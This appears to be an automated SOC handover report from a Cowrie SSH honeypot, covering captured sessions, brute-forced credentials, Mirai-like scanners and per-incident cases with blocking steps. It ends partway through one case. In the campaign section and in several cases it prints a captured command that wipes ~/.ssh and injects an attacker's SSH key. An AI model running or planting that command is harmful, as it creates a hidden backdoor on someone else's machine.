# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-10 |
| **Generated At** | 2026-11-10T05:08:17Z |
| **Shift Time** | 05:08 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **118** |
| Confirmed Threats | **94** |
| False Positives Filtered | **24** (20.3%) |
| Unique Attacker IPs | **65** |
| Countries of Origin | **17** |
| High Severity Cases | **61** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **57** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **768** |
| Unique Credential Pairs | **690** |
| Unique Usernames | **266** |
| Unique Passwords | **501** |
| Successful Auth Pairs | **722** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 289 |
| `ubuntu` | 29 |
| `admin` | 21 |
| `rootssssss23424123123` | 16 |
| `user` | 16 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 44 |
| `1234` | 18 |
| `rootssssss23424123123` | 16 |
| `root3245gs5662d34111111111` | 15 |
| `1` | 15 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 16 |
| `root` | `root3245gs5662d34111111111` | 12 |
| `support` | `support` | 7 |
| `pi` | `abcd1234` | 4 |
| `admin` | `admin` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `pi` | `abcd1234` | `10.0.0.73` | 2026-11-10T00:07:18 |
| `root` | `123456ab@` | `156.235.89.153` | 2026-11-10T00:19:39 |
| `rootssssss23424123123` | `rootssssss23424123123` | `156.235.89.153` | 2026-11-10T00:19:40 |
| `root` | `root3245gs5662d34111111111` | `156.235.89.153` | 2026-11-10T00:19:42 |
| `root` | `passwordlinux` | `4.240.82.91` | 2026-11-10T00:20:59 |
| `rootssssss23424123123` | `rootssssss23424123123` | `4.240.82.91` | 2026-11-10T00:21:03 |
| `root` | `root3245gs5662d34111111111` | `4.240.82.91` | 2026-11-10T00:21:08 |
| `support` | `support` | `10.0.0.73` | 2026-11-10T01:00:38 |
| `ubuntu` | `Welcome@1234` | `10.0.0.73` | 2026-11-10T01:01:09 |
| `rootssssss23424123123` | `rootssssss23424123123` | `10.0.0.73` | 2026-11-10T01:01:12 |
| `ubuntu` | `root3245gs5662d34111111111` | `10.0.0.73` | 2026-11-10T01:01:16 |
| `root` | `Welcome@2026` | `10.0.0.73` | 2026-11-10T01:14:43 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-11-10T01:14:56 |
| `root` | `1` | `80.94.92.179` | 2026-11-10T01:17:08 |
| `root` | `12` | `80.94.92.179` | 2026-11-10T01:19:34 |
| `root` | `123` | `80.94.92.179` | 2026-11-10T01:22:02 |
| `root` | `1234` | `80.94.92.179` | 2026-11-10T01:24:37 |
| `root` | `12345` | `80.94.92.179` | 2026-11-10T01:27:24 |
| `root` | `1234567` | `80.94.92.179` | 2026-11-10T01:32:48 |
| `root` | `admin` | `193.32.162.15` | 2026-11-10T01:33:19 |
_… 702 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **118** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 43 |
| libssh | 17 |
| Unknown | 5 |
| Nmap scanner | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 28 | 2 |
| `f555226df196...` | Mirai/variant | 12 | 6 |
| `4e066189c3bb...` | Generic scanner | 3 | 3 |
| `dde267e50f82...` | Mirai/variant | 3 | 3 |
| `0a07365cc01f...` | Generic scanner | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 28 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `4e066189c3bb...` | Unknown | 3 | 3 | Generic scanner |
| `dde267e50f82...` | Go SSH scanner | 3 | 3 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 2 | 2 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **36** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
linuxshell
```
Source IPs: `58.84.63.63`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `129.121.136.199`, `156.235.89.153`, `193.105.131.7`, `173.244.60.241`, `46.253.45.10`, `4.240.82.91`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **65** |
| Unique ASNs | **28** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 19 | HIGH |
| `AS14061` | DigitalOcean, LLC | 6 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS396982` | Google LLC | 4 | LOW |
| `AS15169` | Google LLC | 4 | HIGH |
| `AS6939` | Hurricane Electric LLC | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (56)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-86aecc75d4a3

| Field | Detail |
|---|---|
| **Source IP** | `156.235.89[.]153` |
| **First Seen** | 2026-11-10 00:19 |
| **Last Seen** | 2026-11-10 00:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 00:19:38` | `cowrie.session.connect` |
| `2026-11-10 00:19:38` | `cowrie.client.version` |
| `2026-11-10 00:19:38` | `cowrie.client.kex` |
| `2026-11-10 00:19:39` | `cowrie.login.success` |
| `2026-11-10 00:19:39` | `cowrie.session.params` |
| `2026-11-10 00:19:39` | `cowrie.command.input` |
| `2026-11-10 00:19:39` | `cowrie.command.failed` |
| `2026-11-10 00:19:39` | `cowrie.log.closed` |
| `2026-11-10 00:19:40` | `cowrie.session.params` |
| `2026-11-10 00:19:40` | `cowrie.command.input` |
| `2026-11-10 00:19:40` | `cowrie.session.file_download` |
| `2026-11-10 00:19:40` | `cowrie.log.closed` |
| `2026-11-10 00:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.235.89[.]153` to AbuseIPDB if not already reported
- [ ] Block `156.235.89[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1f197d7b812

| Field | Detail |
|---|---|
| **Source IP** | `156.235.89[.]153` |
| **First Seen** | 2026-11-10 00:19 |
| **Last Seen** | 2026-11-10 00:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 00:19:40` | `cowrie.session.connect` |
| `2026-11-10 00:19:40` | `cowrie.client.version` |
| `2026-11-10 00:19:40` | `cowrie.client.kex` |
| `2026-11-10 00:19:40` | `cowrie.login.success` |
| `2026-11-10 00:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.235.89[.]153` to AbuseIPDB if not already reported
- [ ] Block `156.235.89[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16edf2e7cee9

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-11-10 00:20 |
| **Last Seen** | 2026-11-10 00:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 00:20:58` | `cowrie.session.connect` |
| `2026-11-10 00:20:58` | `cowrie.client.version` |
| `2026-11-10 00:20:58` | `cowrie.client.kex` |
| `2026-11-10 00:20:59` | `cowrie.login.success` |
| `2026-11-10 00:21:00` | `cowrie.session.params` |
| `2026-11-10 00:21:00` | `cowrie.command.input` |
| `2026-11-10 00:21:00` | `cowrie.command.failed` |
| `2026-11-10 00:21:01` | `cowrie.log.closed` |
| `2026-11-10 00:21:01` | `cowrie.session.params` |
| `2026-11-10 00:21:01` | `cowrie.command.input` |
| `2026-11-10 00:21:02` | `cowrie.session.file_download` |
| `2026-11-10 00:21:02` | `cowrie.log.closed` |
| `2026-11-10 00:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-509d7c350511

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-11-10 00:21 |
| **Last Seen** | 2026-11-10 00:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 00:21:02` | `cowrie.session.connect` |
| `2026-11-10 00:21:02` | `cowrie.client.version` |
| `2026-11-10 00:21:02` | `cowrie.client.kex` |
| `2026-11-10 00:21:03` | `cowrie.login.success` |
| `2026-11-10 00:21:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c889c2ae21f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:17 |
| **Last Seen** | 2026-11-10 01:18 |
| **Session Duration** | 85s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a426302e887d06f491cb4e985bdb1f5f_small_control'"'"' '"'"'check_a426302e887d06f491cb4e985bdb1f5f'"'"'', printf '\n%s|%s\n' 'check_a426302e887d06f491cb4e985bdb1f5f_small_control' 'check_a426302e887d06f491cb4e985bdb1f5f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a426302e887d06f491cb4e985bdb1f5f_small_math'"'"' "$((149*443+22))"', (149*443+22, printf '\n%s|%s\n' 'check_a426302e887d06f491cb4e985bdb1f5f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:17:05` | `cowrie.session.connect` |
| `2026-11-10 01:17:06` | `cowrie.client.version` |
| `2026-11-10 01:17:06` | `cowrie.client.kex` |
| `2026-11-10 01:17:08` | `cowrie.login.success` |
| `2026-11-10 01:17:10` | `cowrie.client.size` |
| `2026-11-10 01:17:11` | `cowrie.session.params` |
| `2026-11-10 01:17:12` | `cowrie.command.input` |
| `2026-11-10 01:17:12` | `cowrie.command.input` |
| `2026-11-10 01:17:12` | `cowrie.command.input` |
| `2026-11-10 01:17:12` | `cowrie.command.input` |
| `2026-11-10 01:17:12` | `cowrie.command.input` |
| `2026-11-10 01:17:12` | `cowrie.command.input` |
| `2026-11-10 01:17:12` | `cowrie.command.input` |
| `2026-11-10 01:17:12` | `cowrie.command.input` |
| `2026-11-10 01:17:12` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be76af08aaf4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:19 |
| **Last Seen** | 2026-11-10 01:20 |
| **Session Duration** | 63s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b1df52ff54c6c05da3d60b80c3cf4dcb_small_control'"'"' '"'"'check_b1df52ff54c6c05da3d60b80c3cf4dcb'"'"'', printf '\n%s|%s\n' 'check_b1df52ff54c6c05da3d60b80c3cf4dcb_small_control' 'check_b1df52ff54c6c05da3d60b80c3cf4dcb', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b1df52ff54c6c05da3d60b80c3cf4dcb_small_math'"'"' "$((671*437+43))"', (671*437+43, printf '\n%s|%s\n' 'check_b1df52ff54c6c05da3d60b80c3cf4dcb_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:19:32` | `cowrie.session.connect` |
| `2026-11-10 01:19:32` | `cowrie.client.version` |
| `2026-11-10 01:19:32` | `cowrie.client.kex` |
| `2026-11-10 01:19:34` | `cowrie.login.success` |
| `2026-11-10 01:19:35` | `cowrie.client.size` |
| `2026-11-10 01:19:36` | `cowrie.session.params` |
| `2026-11-10 01:19:36` | `cowrie.command.input` |
| `2026-11-10 01:19:36` | `cowrie.command.input` |
| `2026-11-10 01:19:36` | `cowrie.command.input` |
| `2026-11-10 01:19:36` | `cowrie.command.input` |
| `2026-11-10 01:19:36` | `cowrie.command.input` |
| `2026-11-10 01:19:36` | `cowrie.command.input` |
| `2026-11-10 01:19:36` | `cowrie.command.input` |
| `2026-11-10 01:19:36` | `cowrie.command.input` |
| `2026-11-10 01:19:36` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d69315efa8c9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:22 |
| **Last Seen** | 2026-11-10 01:22 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f4b625b0ce49a28dbb1a413f33a3da48_small_control'"'"' '"'"'check_f4b625b0ce49a28dbb1a413f33a3da48'"'"'', printf '\n%s|%s\n' 'check_f4b625b0ce49a28dbb1a413f33a3da48_small_control' 'check_f4b625b0ce49a28dbb1a413f33a3da48', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f4b625b0ce49a28dbb1a413f33a3da48_small_math'"'"' "$((833*730+82))"', (833*730+82, printf '\n%s|%s\n' 'check_f4b625b0ce49a28dbb1a413f33a3da48_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:22:00` | `cowrie.session.connect` |
| `2026-11-10 01:22:00` | `cowrie.client.version` |
| `2026-11-10 01:22:00` | `cowrie.client.kex` |
| `2026-11-10 01:22:02` | `cowrie.login.success` |
| `2026-11-10 01:22:02` | `cowrie.client.size` |
| `2026-11-10 01:22:03` | `cowrie.session.params` |
| `2026-11-10 01:22:03` | `cowrie.command.input` |
| `2026-11-10 01:22:03` | `cowrie.command.input` |
| `2026-11-10 01:22:03` | `cowrie.command.input` |
| `2026-11-10 01:22:03` | `cowrie.command.input` |
| `2026-11-10 01:22:03` | `cowrie.command.input` |
| `2026-11-10 01:22:03` | `cowrie.command.input` |
| `2026-11-10 01:22:03` | `cowrie.command.input` |
| `2026-11-10 01:22:03` | `cowrie.command.input` |
| `2026-11-10 01:22:03` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bc9b900c6f4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:24 |
| **Last Seen** | 2026-11-10 01:25 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e87f3e7f4e97faddef22177061e402da_small_control'"'"' '"'"'check_e87f3e7f4e97faddef22177061e402da'"'"'', printf '\n%s|%s\n' 'check_e87f3e7f4e97faddef22177061e402da_small_control' 'check_e87f3e7f4e97faddef22177061e402da', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e87f3e7f4e97faddef22177061e402da_small_math'"'"' "$((697*144+59))"', (697*144+59, printf '\n%s|%s\n' 'check_e87f3e7f4e97faddef22177061e402da_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:24:36` | `cowrie.session.connect` |
| `2026-11-10 01:24:36` | `cowrie.client.version` |
| `2026-11-10 01:24:36` | `cowrie.client.kex` |
| `2026-11-10 01:24:37` | `cowrie.login.success` |
| `2026-11-10 01:24:38` | `cowrie.client.size` |
| `2026-11-10 01:24:38` | `cowrie.session.params` |
| `2026-11-10 01:24:39` | `cowrie.command.input` |
| `2026-11-10 01:24:39` | `cowrie.command.input` |
| `2026-11-10 01:24:39` | `cowrie.command.input` |
| `2026-11-10 01:24:39` | `cowrie.command.input` |
| `2026-11-10 01:24:39` | `cowrie.command.input` |
| `2026-11-10 01:24:39` | `cowrie.command.input` |
| `2026-11-10 01:24:39` | `cowrie.command.input` |
| `2026-11-10 01:24:39` | `cowrie.command.input` |
| `2026-11-10 01:24:39` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72ee729441fb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:27 |
| **Last Seen** | 2026-11-10 01:27 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ab2fc2067ab79a2acbed707cb0431ad4_small_control'"'"' '"'"'check_ab2fc2067ab79a2acbed707cb0431ad4'"'"'', printf '\n%s|%s\n' 'check_ab2fc2067ab79a2acbed707cb0431ad4_small_control' 'check_ab2fc2067ab79a2acbed707cb0431ad4', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ab2fc2067ab79a2acbed707cb0431ad4_small_math'"'"' "$((953*121+77))"', (953*121+77, printf '\n%s|%s\n' 'check_ab2fc2067ab79a2acbed707cb0431ad4_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:27:24` | `cowrie.session.connect` |
| `2026-11-10 01:27:24` | `cowrie.client.version` |
| `2026-11-10 01:27:24` | `cowrie.client.kex` |
| `2026-11-10 01:27:24` | `cowrie.login.success` |
| `2026-11-10 01:27:25` | `cowrie.client.size` |
| `2026-11-10 01:27:26` | `cowrie.session.params` |
| `2026-11-10 01:27:26` | `cowrie.command.input` |
| `2026-11-10 01:27:26` | `cowrie.command.input` |
| `2026-11-10 01:27:26` | `cowrie.command.input` |
| `2026-11-10 01:27:26` | `cowrie.command.input` |
| `2026-11-10 01:27:26` | `cowrie.command.input` |
| `2026-11-10 01:27:26` | `cowrie.command.input` |
| `2026-11-10 01:27:26` | `cowrie.command.input` |
| `2026-11-10 01:27:26` | `cowrie.command.input` |
| `2026-11-10 01:27:26` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-766ac862f5f6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:32 |
| **Last Seen** | 2026-11-10 01:33 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cc7f78d31cf06c9744ba8b0537d1be5a_small_control'"'"' '"'"'check_cc7f78d31cf06c9744ba8b0537d1be5a'"'"'', printf '\n%s|%s\n' 'check_cc7f78d31cf06c9744ba8b0537d1be5a_small_control' 'check_cc7f78d31cf06c9744ba8b0537d1be5a', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cc7f78d31cf06c9744ba8b0537d1be5a_small_math'"'"' "$((508*211+69))"', (508*211+69, printf '\n%s|%s\n' 'check_cc7f78d31cf06c9744ba8b0537d1be5a_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:32:47` | `cowrie.session.connect` |
| `2026-11-10 01:32:47` | `cowrie.client.version` |
| `2026-11-10 01:32:47` | `cowrie.client.kex` |
| `2026-11-10 01:32:48` | `cowrie.login.success` |
| `2026-11-10 01:32:49` | `cowrie.client.size` |
| `2026-11-10 01:32:49` | `cowrie.session.params` |
| `2026-11-10 01:32:49` | `cowrie.command.input` |
| `2026-11-10 01:32:49` | `cowrie.command.input` |
| `2026-11-10 01:32:49` | `cowrie.command.input` |
| `2026-11-10 01:32:49` | `cowrie.command.input` |
| `2026-11-10 01:32:49` | `cowrie.command.input` |
| `2026-11-10 01:32:49` | `cowrie.command.input` |
| `2026-11-10 01:32:49` | `cowrie.command.input` |
| `2026-11-10 01:32:49` | `cowrie.command.input` |
| `2026-11-10 01:32:49` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a99d712ac12

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-11-10 01:33 |
| **Last Seen** | 2026-11-10 01:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-10 01:33:19` | `cowrie.session.connect` |
| `2026-11-10 01:33:19` | `cowrie.client.version` |
| `2026-11-10 01:33:19` | `cowrie.client.kex` |
| `2026-11-10 01:33:19` | `cowrie.login.success` |
| `2026-11-10 01:33:19` | `cowrie.direct-tcpip.request` |
| `2026-11-10 01:33:19` | `cowrie.direct-tcpip.ja4` |
| `2026-11-10 01:33:19` | `cowrie.direct-tcpip.data` |
| `2026-11-10 01:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00baef98eb64

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-10 01:35 |
| **Last Seen** | 2026-11-10 01:35 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
